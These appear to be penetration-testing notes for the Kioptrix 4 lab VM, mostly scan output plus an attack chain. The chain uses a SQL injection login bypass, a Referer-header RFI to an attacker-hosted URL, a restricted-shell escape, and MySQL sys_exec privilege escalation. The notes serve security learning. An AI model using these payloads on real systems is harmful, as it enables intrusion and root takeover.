OS: Ubuntu 12

Web Technology:

IP: 192.168.1.121

USERS: 
john
robert
loneferret

CREDENTIALS:
john:MyNameIsJohn
robert:ADGAdsafdfwt4gadfga==

#####################################################
Community Attack Vectors (To-Try List):

22 → SSH → find username and bruteforce credentials

80 → HTTP → WFUZZ → manual inspection → robots/.DS_STORE/svn/ → login bypass → bruteforce passwords → sql injection → 

139 → netbios-ssn → enum4linux → smbclient

445 → netbios-ssn --> enum4linux → smbclient

#####################################################
NMAP RESULTS:
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)

80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 08:00:27:69:3D:4D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 2h49m42s, median: 0s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain



#####################################################
Steps Taken():
[+] nmap scan
[+] directory fuzzing
[+] SQL injection to bypass authentication
---> username: john
---> password: 'or '1=1
[+] Injecting RFI attempt into 'referer' header produces a valid/complete login when combined with SQL injection leading to valid credentials
----> referer: http://192.168.1.101:8000/test.text
----> using burp to inject this header every step through the authentication process
[+] credentials for John:MyNameIsJohn found
[+] ssh access as john
[+] restricted shell
[+] LShell discovered upon 'sudo' command when the shell crashes
[+] echo os.system('/bin/bash') escapes the restricted shell
[+] checklogin.php has root's password for mysql as null
[+] login as root in mysql successful
[+] User Defined Function set in MySQL
[+] selecting the sys_exec to add John to the admin Group
[+] select sys_exec('usermod -aG admin john');
[+] sudo su w/ johns password gives us root access

#####################################################
Web Services Enumeration:  

[  +  NIKTO   ]
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.

[  +  WFUZZ  ]

FILES:   /   (Web Root)
index.php                                        
checklogin.php                                   
database.sql                                     

DIRECTORIES:  /  (Web Root)
images                                           
icons                                            
john                                             
robert                          
checklogin

#####################################################
OTHER:  

OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain

# "database.sql"
CREATE TABLE `members` (
`id` int(4) NOT NULL auto_increment,
`username` varchar(65) NOT NULL default '',
`password` varchar(65) NOT NULL default '',
PRIMARY KEY (`id`)
) TYPE=MyISAM AUTO_INCREMENT=2 ;

-- 
-- Dumping data for table `members`
-- 

INSERT INTO `members` VALUES (1, 'john', '1234');

Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Apr 12 15:35:52 2022


# enum4linux $IP
( Target Information )
Target ........... 192.168.1.121                                                                                    
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


  KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service
  KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service
  KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service
  ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
  WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
  WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
  WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
                                                                                                                    
[+] Server 192.168.1.121 allows sessions using username '', password ''                                             
Domain Name: WORKGROUP                                                                                              
Domain Sid: (NULL SID)

[+] Got OS info for 192.168.1.121 from srvinfo:                                                                     
  KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)                                              
  platform_id     :     500
  os version      :     4.9
  server type     :     0x809a03
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody   		Name: nobody    Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert   		Name: ,,, Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root     		Name: root      Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john     		Name: ,,, Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret    Name: loneferret,,,     Desc: (null)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]
  Sharename       Type      Comment
  ---------       ----      -------
  print$          Disk      Printer Drivers
  IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
  Workgroup            Master
  ---------            -------
  WORKGROUP            KIOPTRIX4
  [+] KIOPTRIX4
  [+] Builtin
[+] Password Info for Domain: KIOPTRIX4
  [+] Minimum password length: 5
  [+] Password history length: None
  [+] Maximum password age: Not Set
  [+] Password Complexity Flags: 000000
        [+] Domain Refuse Password Change: 0
        [+] Domain Password Store Cleartext: 0
        [+] Domain Password Lockout Admins: 0
        [+] Domain Password No Clear Change: 0
        [+] Domain Password No Anon Change: 0
        [+] Domain Password Complex: 0

  [+] Minimum password age: None
  [+] Reset Account Lockout Counter: 30 minutes 
  [+] Locked Account Duration: 30 minutes 
  [+] Account Lockout Threshold: None
  [+] Forced Log off Time: Not Set
                                                                                                                    
[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username '', password ''
S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\nobody (Local User)
S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\None (Domain Group)
S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\root (Local User)
S-1-22-1-1000 Unix User\loneferret (Local User)                                                                     
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)

#####################################################

Privilege Escalation: 

# (cat /proc/version || uname -a ) 2>/dev/null
Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) #1 SMP Tue Jul 7 20:21:17 UTC 2009

# uname -a
Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux

## checklogin.php 
displays MySQL root login
root:NULL

Mysql is running under root
#locate udf
/lib/modules/2.6.24-24-server/kernel/fs/udf
/lib/modules/2.6.24-24-server/kernel/fs/udf/udf.ko
/usr/lib/lib_mysqludf_sys.so
/usr/share/mysql/mysql-test/include/have_udf.inc
/usr/share/mysql/mysql-test/r/have_udf.require
/usr/share/mysql/mysql-test/r/have_udf_example.require
/usr/share/mysql/mysql-test/r/udf.result
/usr/share/mysql/mysql-test/t/udf.test




#####################################################
Take Away Concepts
